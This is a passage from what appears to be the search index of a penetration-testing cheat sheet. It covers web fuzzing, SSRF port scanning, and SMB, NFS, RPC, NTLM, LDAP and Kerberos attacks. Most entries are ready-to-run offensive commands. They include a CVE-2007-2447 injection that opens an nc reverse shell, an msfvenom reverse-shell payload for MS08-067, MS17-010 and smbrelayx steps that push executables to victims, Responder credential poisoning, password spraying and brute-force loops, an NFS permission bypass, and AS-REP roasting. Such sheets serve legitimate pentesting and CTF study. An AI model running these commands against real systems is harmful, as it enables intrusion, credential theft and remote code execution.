&lt;proxy&gt; -c -b 'admin=FUZZ' # -b &lt;cookies&gt; - Cookies ';' delim # -x &lt;socks5/http&gt;://&lt;ip&gt; - Proxy to use # -replay-proxy &lt;proxy&gt; - Relay # Fuzz POST data with PUT method ffuf -u &lt;url&gt; -w &lt;wlist&gt; -X PUT -c -d 'user=FUZZ' # -X &lt;method&gt; - HTTP method to use # -d &lt;data&gt; - POST data | JSON data # Fuzz creds from a request capture ffuf -request &lt;req&gt; -c -ac -w &lt;ulist&gt;:USER -w &lt;plist&gt;:PASS # -request-proto http - Force HTTP # -mode pitchfork - Use for SQLi # Filter-out HTTP statuses &amp; length ffuf -u '&lt;url&gt;/FUZZ' -c -w &lt;wlist&gt; -fc 500,403,301 -fs 0,1 # -fc &lt;codes&gt; - HTTP statuses # -fs &lt;sizes&gt; - HTTP sizes # -fw &lt;count&gt; - Word count # -fl &lt;count&gt; - Line count # -fr &lt;regex&gt; - Regex # Match codes and regex ffuf -u '&lt;url&gt;/FUZZ' -c -w &lt;wlist&gt; -mc 200,204 -mr '[aA]dmin|pass' # -mc &lt;codes&gt; - HTTP statuses | all # -ms &lt;sizes&gt; - HTTP sizes # -mw &lt;count&gt; - Word count # -ml &lt;count&gt; - Line count # -mr &lt;regex&gt; - Regex . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--bruteforce--ffuf",
    "relUrl": "/#network-enumeration--website---url--bruteforce--ffuf"
  },"53": {
    "doc": "ftf-hacksheet",
    "title": "Gobuster",
    "content": ". | Site - Dir/File/DNS/VHost fuzzer:# Pay attention to 405 codes gobuster dir -t 30 -u &lt;url&gt; -w &lt;dic&gt; # Add --no-error to hide bad urls # Use -k to ignore SSL validation # Use -b with the codes to ignore # Use -s with only the codes to show # Use -x with the extensions to test # Use -f to add a slash to the words # Use -a to set an User-Agent # or use --random-agent # Use -e to show the full URL match # Use -z to hide the progress with # the last resort lists as it breaks # Increase threads with big lists # Use -o to save to file # Use -q to hide banner and progress # Fuzz HTTP parameters gobuster fuzz -u '&lt;url&gt;?FUZZ=test' -w &lt;dic&gt; . | Pattern support | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--bruteforce--gobuster",
    "relUrl": "/#network-enumeration--website---url--bruteforce--gobuster"
  },"54": {
    "doc": "ftf-hacksheet",
    "title": "Wfuzz",
    "content": ". | Site - Multi-purpose fuzzer - docs# -&gt; Filters may glitch the terminal wfuzz -w &lt;wlist&gt; -Z -c '&lt;url&gt;/FUZZ' # -Z - Ignore errors | -c - colors # --hh &lt;n&gt; - Filter by size # --hl &lt;n&gt; - Filter by lines # --hw &lt;n&gt; - Filter by words # --hc &lt;c&gt; - Filter by HTTP code # --hs &lt;r&gt; - Filter by PyRegex # Use --s[hlwcs] &lt;w&gt; for matches # Filter using a baseline + cookie wfuzz -w &lt;wlist&gt; -X HEAD --hh BBB -b 'PHP=lol' -c '&lt;url&gt;/FUZZ{nopage}' # First request will be &lt;url&gt;/nopage # Read from stdin and fuzz POST sed '1,33d' &lt;file&gt; | wfuzz -z stdin -d 'user=FUZZ&amp;pass=test' -c '&lt;url&gt;' # Fuzz HTTP Basic + follow redirect wfuzz -w &lt;wpwd&gt; -w &lt;wusr&gt; --basic 'FUZ2Z:FUZZ' --follow -c '&lt;url&gt;' # Fuzz numeric identifier wfuzz -z range,0-100 -Z -c '&lt;url&gt;/FUZZ' . | wfpayload TODO | Apparently still better than ffuf | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--bruteforce--wfuzz",
    "relUrl": "/#network-enumeration--website---url--bruteforce--wfuzz"
  },"55": {
    "doc": "ftf-hacksheet",
    "title": "Tampering",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--website---url--tampering",
    "relUrl": "/#network-enumeration--website---url--tampering"
  },"56": {
    "doc": "ftf-hacksheet",
    "title": "Wuzz",
    "content": ". | Site - HTTP Client - hidden flags:# Ctrl-J/K: Down/Up |Ctrl-R: Submit # Ctrl-E: Export Curl|Alt-H: History # Ctrl-S: SaveRequest|Ctrl-C: Quit wuzz http://&lt;ip-hostname&gt; # Proxy: -x &lt;proxy-url&gt; # URLencode data + no redirect wuzz --data-urlencode \"user=&lt;hi&gt;\" -R http://&lt;ip-hostname&gt; # For GET urlencode try: -X GET # For binary data: --data-binary &lt;d&gt; # Multiple data: user=user&amp;pass=pass . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--tampering--wuzz",
    "relUrl": "/#network-enumeration--website---url--tampering--wuzz"
  },"57": {
    "doc": "ftf-hacksheet",
    "title": "Mitmproxy",
    "content": ". | Site - Proxy - Docs/Addons (xss/sqli):# Listens on port 8080 by default mitmproxy --anticache -p 8080 # Other mode: -m socks5/transparent # Use addons: -s &lt;addon.py&gt; # Don't verify SSL: -k # Client obtain SSL: http://mitm.it # Vi movement | Commands: f # Regex of captures to show/edit i # Regex of captures to intercept I # Toggle intercept v # Reverse capture order o # Set capture ordering n # Make new request D # Duplicate capture :export.clip curl @focus # Clipboard e # At mainpage view: Export to file e # At capture/intercept view: Edit V # Revert capture/intercept changes r # Replay capture a # Forward selected intercept A # Forward all intercepts X # Drop intercept d # Delete capture z # Delete all captures F # Focus on capture P # Show capture details m # Toggle capture mark M # Toggle show only marked U # Unset all marks Z # Remove not showing S # Start server replay E # Show event log - # Cycle layouts O # Change Options ? # Help (view specific and global) # Capture/Intercept filter expr: ~q # Match Requests ~c &lt;rcode&gt; # Match HTTP Res Code ~m &lt;regex&gt; # Match HTTP Method ~u &lt;regex&gt; # Match URL (default) ~b &lt;regex&gt; # Match Req/Res body ~bs &lt;regex&gt; # Match Response body ~h &lt;regex&gt; # Match Req/Res header ~hq &lt;regex&gt; # Match Request header ~src &lt;regex&gt; # Match src address ~dst &lt;regex&gt; # Match dst address ~marked # Match marked Req/Res ~a # Match assets IMG,JS.. ~e # Match errors ~http ~tcp ~websockets # Match flows # Unary expr: ! &amp; | and: () grouping # For auto-regex replacement check: # Map Remote/Local Modify Body/Headr # Set/Alter headers -&gt; Options modify_headers /&lt;header-name&gt;/&lt;value&gt; # Mitmproxy has a Python library . | Export to curl command format and add -j &lt;cookiejar&gt; to get Netscape cookies | If HAR dumping, use Hargo to process | Use mitmdump for non-interactive CLI | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--tampering--mitmproxy",
    "relUrl": "/#network-enumeration--website---url--tampering--mitmproxy"
  },"58": {
    "doc": "ftf-hacksheet",
    "title": "Requestify",
    "content": ". | Site - Convert Raw HTTP Request:# To NodeJS (JSON header) requestify.py -i &lt;raw&gt; -l nodejs . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--tampering--requestify",
    "relUrl": "/#network-enumeration--website---url--tampering--requestify"
  },"59": {
    "doc": "ftf-hacksheet",
    "title": "RABID",
    "content": ". | Site - RAW Cookie decoder - Docs:rabid '&lt;raw-cookie&gt;' . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--tampering--rabid",
    "relUrl": "/#network-enumeration--website---url--tampering--rabid"
  },"60": {
    "doc": "ftf-hacksheet",
    "title": "SSRF",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--website---url--ssrf",
    "relUrl": "/#network-enumeration--website---url--ssrf"
  },"61": {
    "doc": "ftf-hacksheet",
    "title": "curl",
    "content": ". | Map all open localhost TCP ports:# GET request seq 65535 | xargs -P 0 -I{} sh -c 'curl -m 5 -s \"http://&lt;domain.port&gt;/?url=http://127.0.0.1:{}\" | tr \"\\n\" \" \" | sed -n \"/[^ ]/{s/^/\\n[+] {}:\\n &amp;/;s/$/\\n/p}\"' # POST request seq 65535 | xargs -P 0 -I{} sh -c 'curl -m 5 -s -L --data-urlencode \"url=http://127.0.0.1:{}\" http://&lt;domain.port&gt; | tr \"\\n\" \" \" | sed -n \"/[^ ]/{s/^/\\n[+] {}:\\n &amp;/;s/$/\\n/p}\"' . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--ssrf--curl",
    "relUrl": "/#network-enumeration--website---url--ssrf--curl"
  },"62": {
    "doc": "ftf-hacksheet",
    "title": "URI Schemes",
    "content": " ",
    "url": "http://localhost:4000/#network-enumeration--website---url--uri-schemes",
    "relUrl": "/#network-enumeration--website---url--uri-schemes"
  },"63": {
    "doc": "ftf-hacksheet",
    "title": "HTTP / HTTPS",
    "content": ". | May accept inline Basic Auth: . | http://&lt;usr&gt;:&lt;pass&gt;@&lt;domain/ip&gt; | . | Spaces not allowed - hex-code them | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--uri-schemes--http---https",
    "relUrl": "/#network-enumeration--website---url--uri-schemes--http---https"
  },"64": {
    "doc": "ftf-hacksheet",
    "title": "FTP / FTPS",
    "content": ". | Inline auth supported: . | ftp://&lt;usr&gt;:&lt;pass&gt;@&lt;domain/ip&gt; | . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--uri-schemes--ftp---ftps",
    "relUrl": "/#network-enumeration--website---url--uri-schemes--ftp---ftps"
  },"65": {
    "doc": "ftf-hacksheet",
    "title": "File",
    "content": ". | Like in the filesystem -&gt; Don&#8217;t think it follows the HTTP rules, but some implementations may vary (ex: Windows) | You may specify a hostname: . | file://&lt;host&gt;/&lt;full/path&gt;/file.txt | Omitting &lt;host&gt; means localhost | . | For Windows, the drive is necessary: . | file://&lt;host&gt;/c:/&lt;path&gt;/file.txt | . | Four slash host is an alt for Win UNC: . | file:////&lt;server&gt;/&lt;dir&gt;/file.txt | Like \\\\&lt;server&gt;\\&lt;dir&gt;\\file.txt | . | Spaces supported as is, no hex need: . | file:///&lt;full/path&gt;/test file.txt | . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--uri-schemes--file",
    "relUrl": "/#network-enumeration--website---url--uri-schemes--file"
  },"66": {
    "doc": "ftf-hacksheet",
    "title": "Data",
    "content": ". | Plaintext or Base64, other encodings may be supported: . | data://text/plain,&lt;plaintext&gt; | data://text/plain;base64,&lt;b64text&gt; | . | Optional attributes may allow specifying a filename (name): . | data://application/pdf;name=document.pdf;base64,&lt;b64text&gt; | . | Leading slashes might be omitted: . | data:image/gif;base64,&lt;b64text&gt; | . | . ",
    "url": "http://localhost:4000/#network-enumeration--website---url--uri-schemes--data",
    "relUrl": "/#network-enumeration--website---url--uri-schemes--data"
  },"67": {
    "doc": "ftf-hacksheet",
    "title": "Protocols",
    "content": " ",
    "url": "http://localhost:4000/#protocols",
    "relUrl": "/#protocols"
  },"68": {
    "doc": "ftf-hacksheet",
    "title": "SMB",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smb",
    "relUrl": "/#protocols--smb"
  },"69": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smb--enumeration",
    "relUrl": "/#protocols--smb--enumeration"
  },"70": {
    "doc": "ftf-hacksheet",
    "title": "Nmap",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smb--enumeration--nmap",
    "relUrl": "/#protocols--smb--enumeration--nmap"
  },"71": {
    "doc": "ftf-hacksheet",
    "title": "Safe",
    "content": ". | All enumsnmap -sS -n -sV --open -p135,139,445,1025 -Pn --script=\\*smb\\*enum\\* &lt;ip&gt; # Set a different user/pass with: # --script-args=smbusername=&lt;user&gt; # Use a , and smbpassword=&lt;pass&gt; nmap -sS -n -sV --open -p135,139,445,1025 -Pn --script=\\*smb\\*enum\\* --script-args=smbusername=&lt;user&gt;,smbpassword=&lt;pass&gt; &lt;ip&gt; . | Proto + MBenum + OS + Security + Statnmap -sS -n -sV --open -p135,139,445,1025 -Pn --script=smb-protocols,smb-mbenum,smb-os-discovery,smb-security-mode,smb-system-info,smb2-capabilities &lt;ip&gt; . | Many useful scripts:nmap -sS -n -sV --open -p135,139,445,1025 -Pn --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-services,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-ls,smb-mbenum,smb-os-discovery,smb-protocols,smb-security-mode,smb-server-stats,smb-system-info,smb2-capabilities,smb2-security-mode,smb2-time &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smb--enumeration--nmap--safe",
    "relUrl": "/#protocols--smb--enumeration--nmap--safe"
  },"72": {
    "doc": "ftf-hacksheet",
    "title": "Unsafe",
    "content": ". | All the previous scans can be made unsafe by setting --script-args=unsafe=1 | Vulnerability enums:nmap -sS -n -sV --open -p135,139,445,1025 -Pn --script=smb\\*vuln\\* &lt;ip&gt; . | All &#8220;useful&#8221; SMB scans unsafe-mode:nmap -sS -n -sV --open -p&lt;ports&gt; -Pn --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smb--enumeration--nmap--unsafe",
    "relUrl": "/#protocols--smb--enumeration--nmap--unsafe"
  },"73": {
    "doc": "ftf-hacksheet",
    "title": "enum4linux",
    "content": ". | Site - ng-version - Enum SMB infoenum4linux -d &lt;ip&gt; # -u &lt;user&gt; | -p &lt;pass&gt; # Extra for DCs enum4linux -d -a -l &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smb--enumeration--enum4linux",
    "relUrl": "/#protocols--smb--enumeration--enum4linux"
  },"74": {
    "doc": "ftf-hacksheet",
    "title": "smbclient",
    "content": ". | First add min protocol = NT1 or SMB2 to the end of /etc/smb.conf | List services/shares:# Use -N for no-password # Change the security inline # --option='client min protocol=NT1' smbclient -L &lt;ip&gt; --port=&lt;alt port&gt; --user=&lt;optional user&gt; # &lt;ip&gt; may need to be: # //&lt;ip&gt;/ # \\\\\\\\&lt;ip&gt;\\\\ . | Connect to service:# Use -N for no-password smbclient //&lt;ip&gt;/&lt;service&gt;$ # You will have more luck with those # that don't end in a $ . | Auth access to the System Volume:smbclient -U \"&lt;user&gt;%&lt;pass&gt;\" //&lt;ip&gt;/SYSVOL ls . | . ",
    "url": "http://localhost:4000/#protocols--smb--enumeration--smbclient",
    "relUrl": "/#protocols--smb--enumeration--smbclient"
  },"75": {
    "doc": "ftf-hacksheet",
    "title": "smbmap",
    "content": ". | Site - SMB enumeration tool:smbmap -u 'guest' -H &lt;ip&gt; # Wrong username required to work # -p &lt;passwd/ntlm&gt; # -x &lt;cmd&gt; - Execute command # -R &lt;share&gt; - Recursive listing # --upload &lt;src&gt; &lt;dst&gt; # --download &lt;path&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smb--enumeration--smbmap",
    "relUrl": "/#protocols--smb--enumeration--smbmap"
  },"76": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smb--bruteforce",
    "relUrl": "/#protocols--smb--bruteforce"
  },"77": {
    "doc": "ftf-hacksheet",
    "title": "Hydra",
    "content": ". | Site - Multi-protocol bruteforcer:# Check hydra -U smb for more opts hydra -l admin -P &lt;dict&gt; smb://&lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smb--bruteforce--hydra",
    "relUrl": "/#protocols--smb--bruteforce--hydra"
  },"78": {
    "doc": "ftf-hacksheet",
    "title": "CrackMapExec",
    "content": ". | CrackMapExec - Swiss Army Win pentest# Spray a password across users crackmapexec smb &lt;ip&gt; -u &lt;userlist&gt; -p &lt;passwd&gt; . | SMB reference | . ",
    "url": "http://localhost:4000/#protocols--smb--bruteforce--crackmapexec",
    "relUrl": "/#protocols--smb--bruteforce--crackmapexec"
  },"79": {
    "doc": "ftf-hacksheet",
    "title": "Mount shares",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smb--mount-shares",
    "relUrl": "/#protocols--smb--mount-shares"
  },"80": {
    "doc": "ftf-hacksheet",
    "title": "mount",
    "content": "# Using SMBv1 # Press &lt;Enter&gt; when asked for a # password to mount anonymously mount -t cifs -o vers=1.0,username=guest //&lt;ip&gt;/&lt;service&gt;$ /mnt # Alternative mount -t cifs -o vers=1.0,guest //&lt;ip&gt;/&lt;service&gt;$ /mnt # You may try to pass user=&lt;name&gt; # to impersonate # Last alternative mount -t cifs -o vers=1.0,sec=none //&lt;ip&gt;/&lt;service&gt;$ /mnt # Also try without the trailing $ . ",
    "url": "http://localhost:4000/#protocols--smb--mount-shares--mount",
    "relUrl": "/#protocols--smb--mount-shares--mount"
  },"81": {
    "doc": "ftf-hacksheet",
    "title": "MS-RPC - CVE-2007-2447",
    "content": ". | Affects SMB 3.0.0 &lt; 3.0.25rc3 | Anon login required to a share:# Change the security with # --option='client min protocol=NT1' smbclient -N //&lt;ip&gt;/&lt;share&gt; # logon command must be available help # Spawn a reverse shell logon \"./=`nohup nc -n &lt;ip&gt; &lt;port&gt; -e /bin/sh`\" # Fallback to $() and single quotes . | There&#8217;s also this Python implementation | . ",
    "url": "http://localhost:4000/#protocols--smb--ms-rpc---cve-2007-2447",
    "relUrl": "/#protocols--smb--ms-rpc---cve-2007-2447"
  },"82": {
    "doc": "ftf-hacksheet",
    "title": "MS08-067",
    "content": ". | Use ms08-067.py | Replace the payload with msfvenom:msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=8080 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f py -v shellcode . | Run it:python2 ms08-067.py &lt;ip&gt; &lt;os-type&gt; &lt;port&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smb--ms08-067",
    "relUrl": "/#protocols--smb--ms08-067"
  },"83": {
    "doc": "ftf-hacksheet",
    "title": "MS17-010",
    "content": ". | Modify the Python scripts for just sending files after obtaining a shell (search and comment the service_exec function call) | IMPORTANT: The scripts may fail if using blank credentials, whereas they won&#8217;t with the wrong ones (see smbmap) | helviojunior/MS17-010 . | Win XP - Send and run executables:# Modify USERNAME if needed python2 send_and_execute.py &lt;ip&gt; &lt;shell.exe&gt; . | . | 3ndG4me/AutoBlue-MS17-010 . | Modern scripts but no XP exploitation | Best pipe finder (works in XP):python2 eternal_checker.py &lt;ip&gt; . | . | . ",
    "url": "http://localhost:4000/#protocols--smb--ms17-010",
    "relUrl": "/#protocols--smb--ms17-010"
  },"84": {
    "doc": "ftf-hacksheet",
    "title": "printerbug.py",
    "content": ". | Site - Auth -&gt; SpoolService bug via SMB# Force auth with attacker: responder printerbug.py [[&lt;dom&gt;/]&lt;user&gt;[:&lt;pass&gt;]@]&lt;host/ip&gt; &lt;attacker-ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smb--printerbug-py",
    "relUrl": "/#protocols--smb--printerbug-py"
  },"85": {
    "doc": "ftf-hacksheet",
    "title": "Impacket",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smb--impacket",
    "relUrl": "/#protocols--smb--impacket"
  },"86": {
    "doc": "ftf-hacksheet",
    "title": "PSEXEC",
    "content": ". | psexec.py - SMB upload &amp; exec bin: cmd# By default runs cmd.exe psexec '[dom/]&lt;user&gt;[:&lt;pass&gt;]@&lt;ip&gt;' # -no-pass # -hashes &lt;LM&gt;:&lt;NT&gt; - NTLM auth # -k - Kerberos auth . | . ",
    "url": "http://localhost:4000/#protocols--smb--impacket--psexec",
    "relUrl": "/#protocols--smb--impacket--psexec"
  },"87": {
    "doc": "ftf-hacksheet",
    "title": "SMBserver",
    "content": ". | smbserver.py - Share a path over SMB:# sudo required for port 445 binding sudo smbserver.py share . # Modern need: -smb2support for SMB2 . | Download/Upload files from Windows::: Download copy \\\\&lt;ip&gt;\\share\\&lt;remote-file&gt; . :: Upload copy &lt;local-file&gt; \\\\&lt;ip&gt;\\share\\ . | . ",
    "url": "http://localhost:4000/#protocols--smb--impacket--smbserver",
    "relUrl": "/#protocols--smb--impacket--smbserver"
  },"88": {
    "doc": "ftf-hacksheet",
    "title": "SMBrelayx",
    "content": ". | smbrelayx.py - Serve payload on conn:# Send evil exe to victims smbrelayx.py -h &lt;ip&gt; -e &lt;evil-exe&gt; # The evil exe will be executed . | . ",
    "url": "http://localhost:4000/#protocols--smb--impacket--smbrelayx",
    "relUrl": "/#protocols--smb--impacket--smbrelayx"
  },"89": {
    "doc": "ftf-hacksheet",
    "title": "winexe",
    "content": ". | Site - Execute commands remotely on Windows NT/2000/XP/2003 - winexe serv:winexe -U 'Administrator%&lt;pass&gt;' //&lt;ip&gt; 'cmd.exe' . | . ",
    "url": "http://localhost:4000/#protocols--smb--winexe",
    "relUrl": "/#protocols--smb--winexe"
  },"90": {
    "doc": "ftf-hacksheet",
    "title": "Metasploit",
    "content": ". | There may be some issues with the SMB modules, try the proposed fixes:set SMBUser &lt;user&gt; set SMBPass &lt;password&gt; set SMB_SHARE_NAME &lt;writable_folder&gt; set SMB::AlwaysEncrypt false set SMB::ProtocolVersion 2,3 # Or proto 1 set SMB::ProtocolVersion 1 . | . ",
    "url": "http://localhost:4000/#protocols--smb--metasploit",
    "relUrl": "/#protocols--smb--metasploit"
  },"91": {
    "doc": "ftf-hacksheet",
    "title": "NFS",
    "content": " ",
    "url": "http://localhost:4000/#protocols--nfs",
    "relUrl": "/#protocols--nfs"
  },"92": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--nfs--enumeration",
    "relUrl": "/#protocols--nfs--enumeration"
  },"93": {
    "doc": "ftf-hacksheet",
    "title": "showmount",
    "content": ". | Show the available NFS shares:showmount -e &lt;ip/hostname&gt; # -d -&gt; Dirs mounted by clients # -a -&gt; All info (non-reliable) . | . ",
    "url": "http://localhost:4000/#protocols--nfs--enumeration--showmount",
    "relUrl": "/#protocols--nfs--enumeration--showmount"
  },"94": {
    "doc": "ftf-hacksheet",
    "title": "Mount shares",
    "content": " ",
    "url": "http://localhost:4000/#protocols--nfs--mount-shares",
    "relUrl": "/#protocols--nfs--mount-shares"
  },"95": {
    "doc": "ftf-hacksheet",
    "title": "mount",
    "content": "mkdir /tmp/&lt;path&gt; mount -t nfs &lt;ip&gt;:&lt;rpath&gt; /tmp/&lt;path&gt; -nolock . ",
    "url": "http://localhost:4000/#protocols--nfs--mount-shares--mount",
    "relUrl": "/#protocols--nfs--mount-shares--mount"
  },"96": {
    "doc": "ftf-hacksheet",
    "title": "Bypass Access Permission Restrictions",
    "content": ". | Only works if squashing is disabled:# Remote host - Check for squashing: cat /etc/exports # root_squash -&gt; disable remote root # no_all_squash -&gt; enable remote usr . | List exported folder UID and GID:# Main folder owners ls -lahud &lt;folder&gt; # Folder content owners ls -lahu &lt;folder&gt; . | If no_all_squash is set, create a local user with the same UID and GID:useradd -M -u &lt;uid&gt; -g &lt;gid&gt; -o &lt;name&gt; # -M - Don't create home folder # -o - Allow non-unique ids . | Switch to the user to access the dir:sudo -u &lt;usr&gt; -i /bin/bash # or su &lt;usr&gt; cd /tmp/&lt;path&gt; . | Remove the user:userdel -r &lt;name&gt; # -f - Force deletion . | . ",
    "url": "http://localhost:4000/#protocols--nfs--mount-shares--bypass-access-permission-restrictions",
    "relUrl": "/#protocols--nfs--mount-shares--bypass-access-permission-restrictions"
  },"97": {
    "doc": "ftf-hacksheet",
    "title": "RPC",
    "content": " ",
    "url": "http://localhost:4000/#protocols--rpc",
    "relUrl": "/#protocols--rpc"
  },"98": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--rpc--enumeration",
    "relUrl": "/#protocols--rpc--enumeration"
  },"99": {
    "doc": "ftf-hacksheet",
    "title": "rpcinfo",
    "content": ". | Show all RPC services registered:# Uses rpcbind version 1 rpcinfo -s &lt;ip/host&gt; # -s -&gt; Simplified output # -n &lt;port&gt; -&gt; Use port number # -a &lt;ip:port&gt; -T tcp/udp - Alt # Uses rpcbind version 2 rpcinfo -p &lt;ip/host&gt; # Query service rpcinfo -p &lt;ip/host&gt; &lt;serv-num&gt; # -T tcp/udp -&gt; Force transport # -l -&gt; List all entries . | . ",
    "url": "http://localhost:4000/#protocols--rpc--enumeration--rpcinfo",
    "relUrl": "/#protocols--rpc--enumeration--rpcinfo"
  },"100": {
    "doc": "ftf-hacksheet",
    "title": "rpcclient",
    "content": ". | Anon bind and user enumeration:# Connect as anon user and no-pass rpcclient -U \"\" -N &lt;ip/host&gt; # Also try -U \"%\" # -p &lt;port&gt; - Use instead of 139 enumdomusers # Enum Domain Users enumdomgroups # Enum Domain Groups querygroup &lt;rid&gt; # Group Info querygroupmem &lt;rid&gt; # and Membership queryuser &lt;rid&gt; # User/computer info # Includes pass attempts/cooldown # Info about passwords in... getdompwinfo # the domain getusrdompwinfo &lt;rid&gt; # usr account . | Simple password bruteforce:while read p; do rpcclient -U \"&lt;usr&gt;%$p\" -c 'getusername;quit' &lt;ip/host&gt; 2&gt;&amp;1 | grep -q '&lt;usr&gt;' &amp;&amp; { echo \"Valid pass: $p\"; break; }; done &lt; rockyou.txt # Password-spray by iterating over # the users with just one password . | . ",
    "url": "http://localhost:4000/#protocols--rpc--enumeration--rpcclient",
    "relUrl": "/#protocols--rpc--enumeration--rpcclient"
  },"101": {
    "doc": "ftf-hacksheet",
    "title": "rpcdump",
    "content": ". | Impacket tool: DCE/RPC endpoint mapperrpcdump.py [[dom/]user[:pass]@]&lt;dst&gt; # dst can be: # - IP # - NetBIOS name # -target-ip &lt;ip&gt; (if dst: NB name) # -port &lt;port&gt; . | . ",
    "url": "http://localhost:4000/#protocols--rpc--enumeration--rpcdump",
    "relUrl": "/#protocols--rpc--enumeration--rpcdump"
  },"102": {
    "doc": "ftf-hacksheet",
    "title": "NTLM",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ntlm",
    "relUrl": "/#protocols--ntlm"
  },"103": {
    "doc": "ftf-hacksheet",
    "title": "Capture",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ntlm--capture",
    "relUrl": "/#protocols--ntlm--capture"
  },"104": {
    "doc": "ftf-hacksheet",
    "title": "Responder",
    "content": ". | Site - MS proto poison &amp; collect creds# Capture &lt;iface&gt; - Listen only responder -A -v -I &lt;iface&gt; # Capture &lt;iface&gt; - Poison features responder -wrf -v --lm -I &lt;iface&gt; # -e &lt;ip&gt; - Poison req with &lt;ip&gt; # -b - Basic HTTP auth # -u &lt;proxy&gt; - WPAD upstr HTTP proxy # -P - Force proxy auth # -d - Answer NB dom suffix # -F - Force wpad.dat auth # --disable-ess - ESS downgrade . | Crack the hashes as-is with john or hc | . ",
    "url": "http://localhost:4000/#protocols--ntlm--capture--responder",
    "relUrl": "/#protocols--ntlm--capture--responder"
  },"105": {
    "doc": "ftf-hacksheet",
    "title": "LDAP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ldap",
    "relUrl": "/#protocols--ldap"
  },"106": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ldap--enumeration",
    "relUrl": "/#protocols--ldap--enumeration"
  },"107": {
    "doc": "ftf-hacksheet",
    "title": "ldapsearch",
    "content": ". | From openldap (utils) - Search LDAP# -x uses simple auth ldapsearch -x -H ldap://&lt;ip/domain&gt; -s base # -w &lt;pass&gt; - Pass for simple auth # Only return specific attributes ldapsearch -x -H ldap://&lt;ip/domain&gt; -s base namingcontexts # ^ Finds all domain names . | . ",
    "url": "http://localhost:4000/#protocols--ldap--enumeration--ldapsearch",
    "relUrl": "/#protocols--ldap--enumeration--ldapsearch"
  },"108": {
    "doc": "ftf-hacksheet",
    "title": "ldapdomaindump",
    "content": ". | Site - Dump AD info via LDAP# Leave creds empty for anonymous ldapdomaindump -u '&lt;dom&gt;\\&lt;user&gt;' -p '&lt;pass&gt;' --no-html --no-grep &lt;ip&gt; # &lt;ip&gt; can be ldap[s]://&lt;ip&gt;:&lt;port&gt; # -at SIMPLE - Use simple Auth # -o &lt;dir&gt; - Output directory # -r - Resolve hostname # -m - Dump minimal info # Pretty print JSON output ldd2pretty --directory &lt;path&gt; # Read html output if --no-json cat domain_*.html | w3m -T text/html . | . ",
    "url": "http://localhost:4000/#protocols--ldap--enumeration--ldapdomaindump",
    "relUrl": "/#protocols--ldap--enumeration--ldapdomaindump"
  },"109": {
    "doc": "ftf-hacksheet",
    "title": "Kerberos",
    "content": " ",
    "url": "http://localhost:4000/#protocols--kerberos",
    "relUrl": "/#protocols--kerberos"
  },"110": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration / Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#protocols--kerberos--enumeration---bruteforce",
    "relUrl": "/#protocols--kerberos--enumeration---bruteforce"
  },"111": {
    "doc": "ftf-hacksheet",
    "title": "kerbrute",
    "content": ". | Site - Enum users + brute/spray creds# Enum valid users kerbrute userenum --dc &lt;dc-ip/domain&gt; -d &lt;domain&gt; &lt;usrlist&gt; # dc-domain &amp; domain may be the same # Spray password kerbrute passwordspray --dc &lt;dc-ip/domain&gt; -d &lt;domain&gt; &lt;usrlist&gt; &lt;pass&gt; . | . ",
    "url": "http://localhost:4000/#protocols--kerberos--enumeration---bruteforce--kerbrute",
    "relUrl": "/#protocols--kerberos--enumeration---bruteforce--kerbrute"
  },"112": {
    "doc": "ftf-hacksheet",
    "title": "AS-REP Roasting",
    "content": " ",
    "url": "http://localhost:4000/#protocols--kerberos--as-rep-roasting",
    "relUrl": "/#protocols--kerberos--as-rep-roasting"
  },"113": {
    "doc": "ftf-hacksheet",
    "title": "GetNPUsers",
    "content": ". | Site (Impacket) - Get non-preauth TGTs# Get TGTs for list of users GetNPUsers.py -dc-ip &lt;ip&gt; &lt;domain&gt;/ -usersfile &lt;usrfile&gt; -format &lt;hashcat|john&gt; -outputfile &lt;file&gt; # Get TGTs for all domain users GetNPUsers.py -dc-ip &lt;ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;passwd&gt; -request -format &lt;hashcat|john&gt; -outputfile &lt;file&gt; . | . ",
